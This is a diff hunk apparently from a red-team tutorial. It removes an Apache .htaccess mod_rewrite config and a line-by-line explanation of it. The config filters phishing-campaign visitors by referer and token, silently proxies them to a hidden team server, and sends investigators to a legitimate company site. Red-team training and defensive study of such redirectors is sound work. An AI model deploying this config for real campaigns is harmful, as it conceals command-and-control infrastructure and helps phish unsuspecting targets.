@@ -83,32 +83,6 @@ The actual filtering will be handled by a *.htaccess* file. Place the file at th
 
 Within the *.htaccess file*, enter the following:
 
-<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
-RewriteEngine On<br>
-RewriteCond <span style="color: dodgerblue">%{HTTP_REFERER}</span> <span style="color: mediumseagreen">^http://phishdomain.com</span> <span style="color: tomato">[NC]</span><br>
-RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://TEAMSERVER-IP</span><span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: tomato">[P]</span><br>
-
-RewriteCond <span style="color: dodgerblue">%{QUERY_STRING}</span> <span style="color: mediumseagreen">^id=(.*)</span><br>
-RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">/$1?id=${remap:%1}</span> <span style="color: tomato">[R=302]</span><br>
-RewriteCond <span style="color: dodgerblue">%{QUERY_STRING}</span> <span style="color: mediumseagreen">^id=nftoken</span> <span style="color: tomato">[OR]</span><br>
-RewriteCond <span style="color: dodgerblue">%{QUERY_STRING}</span> <span style="color: mediumseagreen">!^id=*</span><br>
-RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://COMPANY-DOMAIN/</span><span style="color: mediumvioletred">?</span> <span style="color: tomato">[L,R=302]</span><br>
-RewriteRule <span style="color: gold">^(.*)$</span> <span style="color: orange">http://TEAMSERVER-IP</span><span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: tomato">[P]</span><br>
-</div>
-
-Line by line explanation:
-
-<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
-Enable the rewrite engine<br>
-<span style="color: dodgerblue">If the request's HTTP Referer</span> <span style="color: mediumseagreen"> starts with 'http://phishdomain.com' </span> <span style="color: tomato"> (ignoring case),</span><br>
-<span style="color: gold">Change the entire request</span> <span style="color: orange">to serve the </span><span style="color: dodgerblue">original request path</span> <span style="color: orange">from the teamserver's IP, </span><span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
-<span style="color: dodgerblue">If the request's query string</span> <span style="color: mediumseagreen">starts with 'id=', the text after 'id=' is assigned the variable name %1 and</span><br>
-<span style="color: gold">Change the entire request</span> <span style="color: orange"> to '/</span><span style="color: dodgerblue">original request path</span><span style="color: orange"> ?id=' and append the value returned by process.py.</span> <span style="color: tomato"> Redirect the user, changing the address bar, but continue evaluating rules.</span><br>
-<span style="color: dodgerblue">If the quest's query string</span> <span style="color: mediumseagreen">starts with 'id=nftoken'</span> <span style="color: tomato"> OR</span><br>
-<span style="color: dodgerblue">If the request's query string</span> <span style="color: mediumseagreen">does not start with 'id='</span><br>
-<span style="color: gold">Change the entire request</span> <span style="color: orange">to serve http://COMPANY-DOMAIN/</span> <span style="color: mediumvioletred">and drop any query_strings from original request.</span> <span style="color: tomato"> Do not evaluate further rules and redirect the user, changing their address bar.</span><br>
-<span style="color: gold">Otherwise, change the entire request</span> <span style="color: orange">to serve the </span><span style="color:dodgerblue">original request path</span> <span style="color: orange">from the teamserver's IP </span><span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span><br>
-</div>
 
 
 You will need to modify *phishdomain.com*, *TEAMSERVER-IP*, and *COMPANY-DOMAIN* to fit your campaign.
